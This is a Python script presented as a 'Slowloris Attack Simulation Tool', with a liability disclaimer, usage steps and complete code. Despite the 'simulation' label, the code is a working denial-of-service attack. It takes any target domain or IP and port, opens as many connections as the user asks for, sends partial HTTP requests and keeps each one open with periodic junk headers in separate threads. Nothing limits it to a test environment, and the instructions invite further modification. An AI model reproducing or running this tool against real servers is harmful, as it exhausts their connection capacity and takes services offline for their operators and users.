"""
Slowloris Attack Simulation Tool
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script simulates a Slowloris attack by opening multiple HTTP connections and sending partial requests.

Instructions:
1. Run the script from the terminal.
2. Enter the target server's domain or IP and port.
3. The script will open multiple connections and keep them alive.
4. Modify this script to extend functionality as needed.

Required Libraries:
- socket (Standard Python library, no installation required)

Usage:
python3 slowloris_attack_simulator.py
"""

import socket
import threading
import time

def create_connection(target, port):
    """
    Opens and maintains an HTTP connection to the target server.

    :param target: The target server's domain or IP address.
    :param port: The port to connect to (usually 80 for HTTP).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))
        print(f"Connection established to {target}:{port}")
        return s
    except Exception as e:
        print(f"Error creating connection: {e}")
        return None

def maintain_connection(sock):
    """
    Sends periodic data to keep the connection alive.

    :param sock: The socket object for the connection.
    """
    try:
        while True:
            sock.send("X-a: Keep-alive\r\n".encode("utf-8"))
            time.sleep(15)  # Send data every 15 seconds to keep the connection alive
    except Exception as e:
        print(f"Connection lost: {e}")

if __name__ == "__main__":
    print("Welcome to the Slowloris Attack Simulation Tool.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")

    # Input target server and port
    target = input("Enter the target server's domain or IP (e.g., example.com): ")
    try:
        port = int(input("Enter the target port (default: 80): ") or 80)
    except ValueError:
        print("Invalid port number. Defaulting to port 80.")
        port = 80

    # Number of connections to create
    try:
        num_connections = int(input("Enter the number of connections to create: "))
    except ValueError:
        print("Invalid number of connections. Defaulting to 100.")
        num_connections = 100

    # Create and maintain connections
    connections = []
    for _ in range(num_connections):
        conn = create_connection(target, port)
        if conn:
            connections.append(conn)
            threading.Thread(target=maintain_connection, args=(conn,)).start()

    print(f"\nSimulated {len(connections)} connections to {target}:{port}.")
    print("Press Ctrl+C to stop the simulation.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping Slowloris simulation.")
        for conn in connections:
            conn.close()

